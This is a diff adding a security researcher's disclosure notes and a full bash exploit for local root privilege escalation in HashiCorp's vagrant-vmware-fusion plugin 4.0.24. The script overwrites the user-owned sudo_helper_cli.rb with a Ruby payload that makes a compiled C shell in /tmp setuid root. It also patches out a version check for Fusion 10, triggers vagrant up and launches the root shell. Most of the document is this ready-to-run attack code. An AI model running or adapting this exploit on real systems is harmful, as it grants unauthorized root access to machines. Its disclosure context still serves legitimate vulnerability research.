@@ -1,0 +1,219 @@
+# I have previously disclosed a couple of bugs in Hashicorp's vagrant-vmware-fusion plugin for vagrant.
+
+# Unfortunately the 4.0.23 release which was supposed to fix the previous bug I reported didn't address the issue, so Hashicorp quickly put out another release
+# - 4.0.24 - after that (but didn't update the public changelog on github).
+
+# Unfortunately 4.0.24 is still vulnerable, largely due to a fundamental design flaw in the way the plugin is written combined with the need to elevate
+# privileges for certain functions within Fusion.
+
+# Because Hashicorp need users to be able to update the plugin as the local non-root user the encrypted ruby code that the plugin is comprised of must
+# remain owned by the non-root user. This means there is a huge attack surface that we can exploit to manipulate the execution of the program and still get
+# root on 4.0.24.
+
+# I wrote this exploit before Fusion 10 was released and on the surface 4.0.24 is not compatible with Fusion 10. Curiously though it can be fairly easily tricked
+# into working (at least partially) with Fusion 10 simply by patching out the version check and creating a symlink. I discovered this while trying to get the
+# 4.0.24 exploit working with Fusion 10 installed - we can simply monkey-patch the version check out of the code, create a symlink for a binary that VMWare
+# moved in v10 and then we're away. I was able to vagrant up and ssh into the running vm without any issues. It also means I was able to update the exploit so
+# that it works on Fusion 8.x and Fusion 10.
+
+# This seems to be (finally!) fixed properly in 4.0.25 by replacing the suid helper binary with a new go binary that contains all the required elevated
+# operations and doesn't call back to the vulnerable ruby code.
+
+# https://m4.rkw.io/vagrant_vmware_privesc_4.0.24_v8-10.sh.txt
+# 30d54139620bf8e805805d34aa54f4f348b7371642828b28cd0f8c5a7a65c0e8
+# -----------------------------------------------------------------------------
+#!/bin/bash
+echo
+echo "**********************************************************"
+echo "* vagrant_vmware_fusion plugin 4.0.24 local root privesc *"
+echo "* by m4rkw - https://m4.rkw.io/blog.html                 *";
+echo "**********************************************************"
+echo "* works against vmware fusion 8.x and 10.x - even though *"
+echo "* 4.0.24 is not compatible with 10.x, we patch out the   *"
+echo "* version check ;)                                       *"
+echo "**********************************************************"
+echo
+
+cleanup() {
+  exec 2> /dev/null
+  killall -9 vagrant 1>/dev/null 2>/dev/null
+  kill -9 `ps auxwww |egrep '\/vagrant up$' |xargs -L1 |cut -d ' ' -f2` &>/dev/null
+  exec 2> /dev/tty
+  x=`pwd |sed 's/.*\///'`
+  if [ "$x" == ".vagrant_vmware_fusion_4024_exp" ] ; then
+    cd ..
+    rm -rf .vagrant_vmware_fusion_4024_exp
+  fi
+  cd
+  rm -rf .vagrant_vmware_fusion_4024_exp
+  if [ -e "$target1.bak" ] ; then
+    mv -f $target1.bak $target1
+  fi
+  if [ -e "$target2.orig" ] ; then
+    mv -f $target2.orig $target2
+  fi
+}
+
+vuln=`find ~/.vagrant.d//gems/2.3.4/gems/vagrant-vmware-fusion-4.0.24/bin -type f -perm +4000`
+
+if [ "$vuln" == "" ] ; then
+  echo "Vulnerable suid binary not found. It gets +s after the first vagrant up."
+  exit 1
+fi
+
+mkdir .vagrant_vmware_fusion_4024_exp
+cd .vagrant_vmware_fusion_4024_exp
+
+echo "Looking for a vmware_desktop vagrant box ..."
+
+box=`vagrant box list |grep '(vmware_desktop' |head -n1 |cut -d ' ' -f1`
+
+download=0
+
+if [ "$box" == "" ] ; then
+  download=1
+  echo "No box found, defaulting to envimation/ubuntu-xenial ..."
+  box="envimation/ubuntu-xenial"
+fi
+
+echo "Writing a dummy vagrantfile ..."
+
+cat > vagrantfile <<EOF
+Vagrant.configure('2') do |config|
+  config.vm.box = '$box'
+end
+EOF
+
+echo "Compiling the shell invoker ..."
+
+cat > /tmp/v.c <<EOF2
+#include <unistd.h>
+int main()
+{
+  setuid(0);
+  seteuid(0);
+  execl("/bin/bash","bash","-c","rm -f /tmp/v; /bin/bash",NULL);
+  return 0;
+}
+EOF2
+gcc -o /tmp/v /tmp/v.c
+rm -f /tmp/v.c
+
+echo "Looking for the sudo_helper_cli.rb ..."
+
+target1=`find ~/.vagrant.d/ -name sudo_helper_cli.rb |grep vagrant-vmware-fusion-4.0.24`
+
+if [ $target1 == "" ] ; then
+  cleanup
+  echo "sudo_helper_cli.rb version 4.0.24 not found"
+  exit 1
+fi
+
+echo "Installing ruby payload ..."
+
+if [ ! -e "$target1.bak" ] ; then
+  mv -f $target1 $target1.bak
+  if [ ! $? -eq 0 ] ; then
+    cleanup
+    echo "Unable to rename $target1, may not be exploitable."
+    exit 1
+  fi
+fi
+
+cat > $target1 <<EOF
+#!/usr/bin/env ruby
+class HashiCorp::VagrantVMwarefusion::SudoHelperCLI
+  def run(x)
+    \`chown root:wheel /tmp/v\`
+    \`chmod 4755 /tmp/v\`
+  end
+end
+EOF
+
+if [ ! $? -eq 0 ] ; then
+  cleanup
+  echo "Unable to write to $target1, may not be exploitable."
+  exit 1
+fi
+
+vc=`/Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx -v 2>&1 |grep 'VMware Fusion 10.'`
+
+if [ "$vc" != "" ] ; then
+  echo "Fusion 10.x detected, Patching out the version check ..."
+
+  target2=`find ~/.vagrant.d/ -name driver.rb |grep vagrant-vmware-fusion-4.0.24`
+
+  if [ "$target2" == "" ] ; then
+    cleanup
+    echo "driver.rb version 4.0.24 not found"
+    exit 1
+  fi
+
+  if [ ! -e "$target2.orig" ] ; then
+    mv -f $target2 $target2.orig
+    if [ ! $? -eq 0 ] ; then
+      cleanup
+      echo "Unable to rename $target2, may not be exploitable."
+      exit 1
+    fi
+  fi
+
+  cat > $target2 <<EOF
+load File.dirname(__FILE__) + "/driver.rb.orig"
+
+module DriverVersionHack
+  def verify!
+  end
+end
+
+class HashiCorp::VagrantVMwarefusion::Driver::Fusion
+  prepend DriverVersionHack
+end
+EOF
+fi
+
+echo "Triggering vagrant up ..."
+
+vagrant up &>/dev/null &
+
+success=0
+
+
+if [ $download -eq 1 ] ; then
+  echo "*** we need to download the vmware box so this will take a minute or two ***"
+fi
+
+echo "Waiting for payload to trigger ..."
+
+count=0
+
+while :
+do
+  r=`ls -la /tmp/v |grep -- '-rwsr-xr-x  1 root  wheel'`
+  if [ "$r" != "" ] ; then
+    success=1
+    break
+  fi
+  r=`ps auxwww |egrep '\/vagrant up$'`
+  if [ "$r" == "" ] ; then
+    break
+  fi
+  sleep 0.2
+  count=$(($count + 1))
+  if [ $count -eq 150 ] ; then
+    echo "Timed out waiting for the payload to trigger."
+    cleanup
+    exit 1
+  fi
+done
+
+cleanup
+
+if [ ! $success -eq 1 ] ; then
+  echo "Exploit failed."
+  exit 1
+fi
+
+echo
+
+/tmp/v
